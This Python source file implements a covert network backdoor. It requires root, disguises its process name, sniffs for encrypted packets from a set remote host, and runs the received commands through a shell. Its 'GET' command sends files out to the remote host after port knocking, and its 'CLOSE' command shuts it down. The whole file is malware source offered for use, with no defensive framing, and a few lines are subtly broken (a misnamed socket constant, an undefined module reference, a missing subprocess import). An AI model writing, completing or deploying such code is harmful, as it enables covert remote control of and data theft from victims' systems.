import socket, os, sys, time, logging
from scapy.all import *
import setproctitle
import encryption
import netifaces
import helpers

class Backdoor(object):

    def __init__(self, lhost, lport, lisport, rhost, rport, proto, password, kList):
        self.state = 0
        self.localIP = lhost
        self.localPort = int(lport)
        self.listenPort = int(lisport)
        self.remoteIP = rhost
        self.remotePort = int(rport)
        self.protocol = proto.upper()

        self.knockList = []
        for port in kList.split(','):
            self.knockList.append(port)
            
        self.password = password
        self.chunk_size = 16

    def run(self):
        helpers.checkRootPrivilege()
        helpers.maskProcess()
        self.listen()

    def listen(self):
        mFilter = self.protocol.lower() + " and src host " + self.remoteIP + " and dst port " + str(self.localPort) + \
                " and src port " + str(self.remotePort)
        sniff(lfilter=self.is_incoming, filter=mFilter, prn=self.parsePacket)

    def parsePacket(self, packet):
        payload = packet[self.protocol].payload.load
        payload = helpers.decode(encryption.decrypt(payload))

        if payload == "":
            return

        pwd = payload[:8]
        cmd = payload[8:]

        if pwd not in self.password:
            return
        else:
            self.executeCmd(cmd)

    def executeCmd(self, cmd):
        print("Executing command: {}".format(cmd))
        result = ""
        if cmd[:3] == 'cd ':
            try:
                helpers.cd(cmd[3:])
            except OSError as e:
                result = str(e)
        elif cmd[:4] == 'GET ':
            filename = cmd[4:]
            if not os.path.exists(filename):
                result = "File doesn't exist\n"

            self.sendFile(filename)
        elif cmd[:5] == 'CLOSE':
            print("Backdoor closed...\n")
            sys.exit(0)
        else:
            result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            result = result.stdout.read() + result.stderr.read()

        print("Result: %s" % result)
        self.sendPacket(result)
        time.sleep(0.1)

    def sendPacket(self, data):
        data = helpers.decode(data)

        payload = encryption.encrypt(self.password + data)
        #chunks = [payload[start:start + chunk_size] for start in range(0, len(payload), chunk_size)]
        if self.protocol == 'TCP':
            packet = IP(dst=self.remoteIP, src=self.localIP)/TCP(dport=self.remotePort, sport=self.localPort)/Raw(load=payload)
        elif self.protocol == 'UDP':
            packet = IP(dst=self.remoteIP, src=self.localIP)/UDP(dport=self.remotePort, sport=self.localPort)/Raw(load=payload)

        send(packet, verbose=False)

    def sendFile(self, filename):
        knocker = self.portKnocking(self.knockList)

        time.sleep(1)

        sock = socket.socket(socket.AF_INET, socket.SOCKET_STREAM)
        sock.connect((self.remoteIP, self.listenPort))

        encryptedString = encrypt.encryptedFile(filename)

        sock.sendall(encryptedString)
        sock.send(b'EOF')

    def portKnocking(self, knockList):
        for port in knockList:
            pkt = IP(src=self.localIP, dst=self.remoteIP)/UDP(dport=port)
            send(pkt, verbose=False)

    def is_incoming(self, packet):
        """
        Check if packets are incoming or outgoing.
        """
        # Get the default hardware interface
        defaultInterface = netifaces.gateways()['default'][netifaces.AF_INET][1]
        hardwareAddr = netifaces.ifaddresses(defaultInterface)[netifaces.AF_LINK][0]['addr']
        return packet[Ether].src != hardwareAddr
